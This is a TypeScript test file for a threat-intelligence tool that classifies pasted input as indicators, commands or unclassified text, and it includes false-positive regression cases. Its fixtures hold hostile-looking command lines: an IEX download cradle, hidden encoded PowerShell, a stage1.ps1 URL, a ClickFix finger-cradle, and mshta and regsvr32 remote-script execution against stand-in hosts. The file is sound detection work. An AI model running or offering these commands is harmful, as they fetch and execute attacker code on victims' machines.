import { describe, expect, it } from 'vitest'
import { detectType, refang } from './indicators'
import { classifyCockpitInput } from './intent'

describe('classifyCockpitInput — indicator branch', () => {
  it('classifies a bare IPv4 as indicator', () => {
    expect(classifyCockpitInput('185.220.101.34')).toBe('indicator')
  })
  it('classifies a bare domain as indicator', () => {
    expect(classifyCockpitInput('evil-example.com')).toBe('indicator')
  })
  it('classifies a bare URL as indicator', () => {
    expect(classifyCockpitInput('https://example.com/path')).toBe('indicator')
  })
  it('classifies a bare MD5 hash as indicator', () => {
    expect(classifyCockpitInput('d41d8cd98f00b204e9800998ecf8427e')).toBe('indicator')
  })
  it('classifies a bare CVE id as indicator', () => {
    expect(classifyCockpitInput('CVE-2024-12345')).toBe('indicator')
  })
})

describe('classifyCockpitInput — command branch', () => {
  it('classifies any multi-line paste as command', () => {
    expect(classifyCockpitInput('8.8.8.8\n1.1.1.1')).toBe('command')
  })
  it('classifies a PowerShell invocation token as command', () => {
    expect(classifyCockpitInput('IEX (New-Object Net.WebClient).DownloadString($u)')).toBe('command')
  })
  it('classifies -enc as command, case-insensitively', () => {
    expect(classifyCockpitInput('POWERSHELL -NOP -W HIDDEN -ENC JABzAGUA')).toBe('command')
  })
  it('classifies shell punctuation with >=2 tokens as command', () => {
    expect(classifyCockpitInput('echo hi; whoami')).toBe('command')
  })
  it('does NOT classify shell punctuation in a single token as command', () => {
    // one token, no whitespace — not a command line, and not indicator-shaped
    // either (no dot+TLD), so it falls through to unclassified.
    expect(classifyCockpitInput('a;b')).toBe('unclassified')
  })
  it('classifies powershell.exe as command, not as a bare domain', () => {
    // detectType's domain regex (indicators.ts:62) would otherwise match this
    // as a domain — the command check must run first and win.
    expect(classifyCockpitInput('powershell.exe')).toBe('command')
    expect(detectType(refang('powershell.exe'))).toBe('domain') // sanity: proves the ordering matters
  })
})

describe('classifyCockpitInput — data boundary (spec §2.1/§6)', () => {
  it('classifies a script whose first line is a download URL as command, never indicator', () => {
    const raw =
      'http://evil.example.com/stage1.ps1\npowershell -nop -w hidden -enc JABzAGUAYwB1AHIAZQBTAHQAcgBpAG4AZwA='
    expect(classifyCockpitInput(raw)).toBe('command')
    // Sanity: detectType alone (the old single-classifier path) misreads this
    // as a bare url, because its regex is prefix-only, not end-anchored —
    // exactly the leak classifyCockpitInput exists to short-circuit before.
    expect(detectType(refang(raw))).toBe('url')
  })
})

describe('classifyCockpitInput — hyphenated-domain regression (ENC_FLAG_RE / invoke-* anchoring)', () => {
  // ENC_FLAG_RE and the invoke-* cmdlet check are token-anchored (preceded by
  // whitespace/start-of-string; invoke-* also requires a trailing
  // whitespace/`(`/end boundary). Before that anchoring, a bare `-e`/`-enc`
  // or `invoke-\w+` fired mid-word inside an ordinary hyphenated domain
  // label or URL path segment, misrouting it to 'command'. Fails safe (never
  // leaks to /api/enrich) but wrong — these are legitimate indicators.
  it('does not misroute a domain with -e mid-label as command', () => {
    expect(classifyCockpitInput('site-e.com')).toBe('indicator')
  })
  it('does not misroute a domain with -enc mid-label as command', () => {
    expect(classifyCockpitInput('site-enc.com')).toBe('indicator')
  })
  it('does not misroute another -enc domain as command', () => {
    expect(classifyCockpitInput('sync-enc.io')).toBe('indicator')
  })
  it('does not misroute a URL with an -enc path segment as command', () => {
    expect(classifyCockpitInput('https://example.com/setup-enc')).toBe('indicator')
  })
  it('does not misroute an invoke-prefixed domain as command', () => {
    expect(classifyCockpitInput('invoke-example.com')).toBe('indicator')
  })

  // Guard against regressing the real command detections while fixing the above.
  it('still classifies a real -enc flag as command', () => {
    expect(classifyCockpitInput('powershell -nop -w hidden -enc JABzAGUA')).toBe('command')
  })
  it('still classifies a bare -enc flag at string start as command', () => {
    expect(classifyCockpitInput('-enc JABzAGUA')).toBe('command')
  })
  it('still classifies a real Invoke-WebRequest cmdlet call as command', () => {
    expect(classifyCockpitInput('Invoke-WebRequest https://x.test/a')).toBe('command')
  })
  it('still classifies an IEX/New-Object invocation as command', () => {
    expect(classifyCockpitInput('IEX (New-Object Net.WebClient).DownloadString($u)')).toBe('command')
  })
})

describe('classifyCockpitInput — multi-interpreter / cmd / LOLBin commands', () => {
  it('classifies the finger-cradle ClickFix cmd command as command', () => {
    const raw =
      "cmd.exe /c for /f %e in ('f^inger user@45.9.148.20') do cmd.exe /c %e & echo x"
    expect(classifyCockpitInput(raw)).toBe('command')
  })
  it('classifies a bare cmd /c invocation as command', () => {
    expect(classifyCockpitInput('cmd /c whoami & echo x')).toBe('command')
  })
  it('classifies an mshta download-and-execute as command', () => {
    expect(classifyCockpitInput('mshta http://45.9.148.20/x.hta')).toBe('command')
  })
  it('classifies a wscript invocation as command', () => {
    expect(classifyCockpitInput('wscript //E:vbscript C:\\Users\\Public\\x.vbs')).toBe('command')
  })
  it('classifies a regsvr32 scriptlet-execution LOLBin as command', () => {
    expect(classifyCockpitInput('regsvr32 /s /n /u /i:http://x/y.sct scrobj.dll')).toBe('command')
  })
})

describe('classifyCockpitInput — cmd/LOLBin false-positive regression (no misroute to enrich)', () => {
  it('does not misroute a bare cmd.com domain as command', () => {
    expect(classifyCockpitInput('cmd.com')).toBe('indicator')
  })
  it('does not misroute a bare finger.io domain as command', () => {
    expect(classifyCockpitInput('finger.io')).toBe('indicator')
  })
  it('does not misroute a URL with a query-string & as command', () => {
    expect(classifyCockpitInput('https://example.com/x?a=1&b=2')).toBe('indicator')
  })
  it('does not misroute a bare SHA-256 hash as command', () => {
    expect(
      classifyCockpitInput('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')
    ).toBe('indicator')
  })
  it('does not misroute a bare IPv4 as command', () => {
    expect(classifyCockpitInput('45.9.148.20')).toBe('indicator')
  })
})

describe('classifyCockpitInput — unclassified + determinism', () => {
  it('classifies empty input as unclassified', () => {
    expect(classifyCockpitInput('')).toBe('unclassified')
  })
  it('classifies noise as unclassified', () => {
    expect(classifyCockpitInput('just some plain words')).toBe('unclassified')
  })
  it('is deterministic', () => {
    const raw = 'CVE-2024-12345'
    expect(classifyCockpitInput(raw)).toBe(classifyCockpitInput(raw))
  })
})
